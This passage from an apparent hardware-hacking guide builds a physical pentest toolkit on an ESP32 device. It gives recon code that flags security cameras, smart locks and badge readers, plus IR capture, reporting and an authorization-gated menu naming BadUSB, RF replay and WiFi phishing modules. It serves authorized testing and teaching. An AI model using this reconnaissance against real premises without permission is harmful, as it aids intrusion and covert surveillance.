    logger.logEvent("WIFI", "Network scan complete");
}

void WiFiReconModule::detectSecurityCameras() {
    // Common security camera vendor OUIs and SSID patterns
    const char* camera_ouis[] = {
        "28:6C:07",  // Xiaomi (Yi cameras)
        "FC:D7:33",  // Wyze
        "9C:8E:CD",  // Amcrest
        "E8:AB:FA",  // Shenzhen (generic IP cams)
        "AC:CF:23",  // HiKVision
        "54:C4:15",  // Reolink
    };

    // Flag any matches
    // This helps pentesters identify surveillance coverage
}
```

**Step 6 --- Implement Module 3: BLE Recon**

```c
// ble_recon.h
class BLEReconModule {
public:
    void enumerateDevices();
    void identifyAccessControl();
    void trackDevices();

private:
    void classifyBLEDevice(BLEAdvertisedDevice& device);
};

void BLEReconModule::identifyAccessControl() {
    logger.logEvent("BLE", "Access control scan started");

    // Scan for BLE devices with characteristics common to
    // access control systems (smart locks, badge readers)
    BLEDevice::init("");
    BLEScan* scan = BLEDevice::getScan();
    scan->setActiveScan(true);  // Need service UUIDs
    scan->setInterval(100);
    scan->setWindow(99);

    BLEScanResults results = scan->start(10, false);

    for (int i = 0; i < results.getCount(); i++) {
        BLEAdvertisedDevice device = results.getDevice(i);

        // Check for known access control service UUIDs
        // Kisi: specific service UUID
        // August Lock: specific service UUID
        // HID Global: specific service UUID

        if (device.haveServiceUUID()) {
            BLEUUID uuid = device.getServiceUUID();
            classifyBLEDevice(device);
        }

        // Check device name patterns
        String name = device.getName().c_str();
        if (name.indexOf("Lock") >= 0 ||
            name.indexOf("Access") >= 0 ||
            name.indexOf("Door") >= 0 ||
            name.indexOf("Badge") >= 0) {

            char desc[128];
            snprintf(desc, sizeof(desc),
                "Potential access control device: %s "
                "(RSSI: %d dBm, Addr: %s)",
                name.c_str(), device.getRSSI(),
                device.getAddress().toString().c_str());

            logger.logFinding("BLE", "INFO",
                "Access Control Device Detected", desc);
        }
    }

    scan->clearResults();
    BLEDevice::deinit(false);
    logger.logEvent("BLE", "Access control scan complete");
}
```

**Step 7 --- Implement Module 4: IR Capture**

```c
// ir_capture.h
class IRCaptureModule {
public:
    void captureMode();
    void replayMode();
    void catalogRemotes();

private:
    void saveCapture(const char* location, const char* device);
};

void IRCaptureModule::catalogRemotes() {
    // In a physical pentest, cataloging IR-controlled devices
    // reveals what can be controlled: TVs in lobbies,
    // projectors in meeting rooms, HVAC systems, lighting

    displayMessage("IR CATALOG MODE\n\n"
        "Aim T-Embed at each\n"
        "IR-controlled device.\n"
        "Press any remote button.\n"
        "Label each capture with\n"
        "location and device type.");

    while (!exitRequested()) {
        if (irSignalReceived()) {
            IRCapture cap = decodeIR();
            displayCapture(&cap);

            // Prompt for location label
            char location[32], device[32];
            inputText(location, 31);  // e.g., "Lobby"
            inputText(device, 31);    // e.g., "Samsung TV"

            saveCapture(location, device);
            logger.logEvent("IR", "Captured",
                (String(location) + " - " + device).c_str());
        }
    }
}
```

**Step 8 --- Implement the Report Generator**

After an engagement, export all findings to a structured report:

```c
// report.h
class ReportGenerator {
public:
    void generateReport(const char* engagement_dir);

private:
    void writeHeader(File& f, EngagementAuth* auth);
    void writeFindings(File& f, const char* log_path);
    void writeSummary(File& f);
};

void ReportGenerator::generateReport(const char* engagement_dir) {
    char report_path[64];
    snprintf(report_path, sizeof(report_path),
        "%s/report.txt", engagement_dir);

    File f = SD.open(report_path, FILE_WRITE);
    if (!f) return;

    f.println("============================================");
    f.println("  PHYSICAL PENETRATION TEST REPORT");
    f.println("============================================");
    f.println();
    f.printf("Client:     %s\n", auth.client_name);
    f.printf("Tester:     %s\n", auth.tester_name);
    f.printf("Scope:      %s\n", auth.scope);
    f.printf("Date:       %s\n", auth.auth_date);
    f.println();
    f.println("--------------------------------------------");
    f.println("  EXECUTIVE SUMMARY");
    f.println("--------------------------------------------");
    f.println();

    // Count findings by severity
    int critical = 0, high = 0, medium = 0, low = 0, info = 0;
    countFindingsBySeverity(engagement_dir,
        &critical, &high, &medium, &low, &info);

    f.printf("Total Findings: %d\n",
        critical + high + medium + low + info);
    f.printf("  Critical: %d\n", critical);
    f.printf("  High:     %d\n", high);
    f.printf("  Medium:   %d\n", medium);
    f.printf("  Low:      %d\n", low);
    f.printf("  Info:     %d\n", info);
    f.println();
    f.println("--------------------------------------------");
    f.println("  DETAILED FINDINGS");
    f.println("--------------------------------------------");

    // Parse JSONL log and write each finding
    writeFindings(f, engagement_dir);

    f.println();
    f.println("--------------------------------------------");
    f.println("  EVIDENCE LOG");
    f.println("--------------------------------------------");
    f.println("Full evidence log available in evidence.jsonl");
    f.println();
    f.println("============================================");
    f.println("  END OF REPORT");
    f.println("============================================");

    f.close();

    displayMessage("Report generated:\n" + String(report_path));
    logger.logEvent("SYSTEM", "Report generated");
}
```

**Step 9 --- Build the Professional Main Menu**

```c
// main.cpp
#include "ui/menu.h"
#include "ui/display.h"
#include "ui/input.h"
#include "services/auth_check.h"
#include "services/logger.h"
#include "modules/rf_recon.h"
#include "modules/wifi_recon.h"
#include "modules/ble_recon.h"
#include "modules/ir_capture.h"
#include "modules/badusb.h"
#include "modules/signal_replay.h"
#include "modules/evil_portal.h"
#include "services/report.h"

AuthChecker authChecker;
EvidenceLogger logger;
DisplayManager display;
InputHandler input;

void setup() {
    Serial.begin(115200);
    display.init();
    input.init();
    initSD();
    initCC1101();

    display.showSplash("PENTEST TOOLKIT", "v1.0.0");
    delay(2000);

    // Require engagement setup before any testing
    if (!authChecker.startEngagement()) {
        display.showError("No engagement active.\n"
                          "Toolkit in VIEW-ONLY mode.");
    } else {
        logger.init(authChecker.getEngagementName());
    }
}

MenuItem mainMenu[] = {
    {"RF Recon",       "Scan sub-GHz spectrum",     launchRFRecon},
    {"WiFi Recon",     "Map wireless networks",     launchWiFiRecon},
    {"BLE Recon",      "Enumerate BLE devices",     launchBLERecon},
    {"IR Capture",     "Capture/replay IR signals", launchIRCapture},
    {"BadUSB",         "HID payload deployment",    launchBadUSB},
    {"Signal Replay",  "Test RF replay attacks",    launchReplay},
    {"Evil Portal",    "WiFi phishing demo",        launchEvilPortal},
    {"Report",         "Generate engagement report", launchReport},
    {"Settings",       "Configure toolkit",         launchSettings},
};

void loop() {
    display.drawStatusBar(getBatteryPct(), getActiveRadio(),
        authChecker.isEngagementActive());

    int selection = input.handleMenu(mainMenu, 9);
    if (selection >= 0) {
        const char* required_auth = getModuleAuth(selection);
        if (authChecker.isAuthorized(required_auth)) {
            mainMenu[selection].action();
        } else {
            display.showError("Module not authorized\n"
                              "for this engagement.");
            logger.logEvent("SYSTEM", "Unauthorized module access",
                mainMenu[selection].name);
        }
    }
}
```

**Step 10 --- Implement the Professional Status Display**

```
┌──────────────────────────────────────────┐
│ BAT:87% │ RF:433M │ ENGAGED │ 14:30:22  │
│──────────────────────────────────────────│
│                                          │
│   PENTEST TOOLKIT v1.0.0                 │
│   Client: Acme Corp (Lab)                │
│                                          │
│   ► RF Recon         [AUTHORIZED]        │
│     WiFi Recon       [AUTHORIZED]        │
│     BLE Recon        [AUTHORIZED]        │
│     IR Capture       [AUTHORIZED]        │
│     BadUSB           [NOT IN SCOPE]      │
│     Signal Replay    [AUTHORIZED]        │
│     Evil Portal      [NOT IN SCOPE]      │
│     Report           [AVAILABLE]         │
│     Settings                             │
│                                          │
│──────────────────────────────────────────│
│ Findings: 3C 5H 2M │ Events: 147        │
└──────────────────────────────────────────┘
```

Each module shows its authorization status at a glance. The status bar displays battery level, active radio, engagement status, and elapsed time. The footer shows a running count of findings by severity and total logged events.

### Expected Results

- The authorization checklist prevents accidental or unauthorized use of testing modules
- Each module operates independently without interfering with others --- switching from WiFi scanning to BLE scanning is seamless
- The evidence logger captures every action with millisecond-precision timestamps
- A one-hour engagement will generate 200--500 log entries depending on activity
- The report generator produces a structured text document suitable for professional delivery
- The tool boots to the engagement setup screen in under 3 seconds
- Battery life is 4--8 hours depending on which radios are active
- The modular architecture allows adding new modules without modifying existing code
- The complete firmware compiles to under 2 MB, fitting comfortably in the ESP32-S3's flash

{: .tip }
> Build and test one module at a time. Start with the framework (authorization, logging, menu system, display), then add RF Recon first (it is self-contained and exercises the CC1101 driver). Add WiFi and BLE next, then IR. Save BadUSB and Evil Portal for last because they require the most careful testing. The logging and reporting infrastructure should be solid before you add any attack modules.

### Extensions

- Add encrypted log storage so evidence cannot be tampered with if the device is lost
- Implement a "panic button" (long-press encoder for 5 seconds) that securely wipes all engagement data
- Build a companion web dashboard that reads the SD card and visualizes findings on a floor plan
- Add GPS logging (via UART module) for geolocation of every finding
- Implement WiFi-based live streaming of the evidence log to a monitoring laptop
- Create engagement templates for common pentest scenarios (office building, warehouse, retail)
- Add photo documentation by integrating a small camera module for evidence capture
- Build an "auto-recon" mode that runs all authorized reconnaissance modules sequentially
- Implement finding deduplication so repeated scans do not inflate the finding count
- Create exportable finding templates that integrate with professional pentest reporting tools (PlexTrac, Dradis)

---

## Project Difficulty Summary

| # | Project | Difficulty | Time Estimate | Key Skill |
|:--|:--------|:-----------|:-------------|:----------|
| 1 | RF Environment Audit | Beginner | 2--3 hours | RF scanning |
| 2 | Universal IR Remote | Beginner | 1--2 hours | IR capture/replay |
| 3 | Weather Station Decoder | Intermediate | 4--8 hours | Protocol analysis |
| 4 | Home Security RF Audit | Intermediate | 3--5 hours | Pentest methodology |
| 5 | BLE Device Tracker | Intermediate | 4--6 hours | BLE fundamentals |
| 6 | WiFi Security Auditor | Intermediate | 3--5 hours | WiFi security |
| 7 | Custom RF Protocol | Advanced | 10--20 hours | Protocol design |
| 8 | Replay Defense Tester | Advanced | 5--10 hours | Vulnerability testing |
| 9 | Spectrum Monitor | Advanced | 15--25 hours | DSP and visualization |
| 10 | Integrated Multi-Tool | Expert | 40--80 hours | Full-stack embedded |
| 11 | Doorbell Protocol Reverse Engineering | Intermediate | 4--8 hours | OOK protocol analysis |
| 12 | TPMS Receiver | Intermediate | 6--10 hours | FSK decoding |
| 13 | Smart Home IR + RF Hub | Intermediate | 10--20 hours | Multi-radio integration |
| 14 | WiFi Deauth Detector | Advanced | 8--15 hours | 802.11 monitoring |
| 15 | BLE Asset Tracker | Intermediate | 8--12 hours | BLE proximity |
| 16 | Morse Code RF Transceiver | Beginner | 4--6 hours | OOK modulation |
| 17 | Car Key Fob Signal Analyzer | Intermediate | 4--8 hours | Rolling code analysis |
| 18 | BLE Proximity Door Lock Simulator | Advanced | 10--20 hours | BLE GATT security |
| 19 | Automated RF Vulnerability Scanner | Advanced | 15--25 hours | RF pentesting |
| 20 | Evil Portal Credential Awareness Trainer | Advanced | 8--15 hours | WiFi captive portals |
| 21 | Wardriving Data Logger with GPS | Intermediate | 8--15 hours | WiFi recon + GPS |
| 22 | FHSS Communication System | Expert | 20--40 hours | Spread spectrum |
| 23 | BadUSB Payload Development Lab | Advanced | 10--20 hours | HID exploitation |
| 24 | IoT Device RF Fingerprinting | Expert | 25--40 hours | Signal analysis |
| 25 | Physical Penetration Testing Toolkit | Expert | 60--100 hours | Full pentest workflow |

{: .tip }
> Do not skip the beginner projects even if you are experienced. They build foundational familiarity with the T-Embed's interface and capabilities that every advanced project depends on.

---

{: .warning }
> **Reminder**: Every project in this chapter must be performed only on devices and networks you own or have explicit written permission to test. Unauthorized access, interception, or interference is a crime. When in doubt, do not transmit. See [Chapter 13 --- Legal Reference](13-legal-reference/) for comprehensive legal guidance.
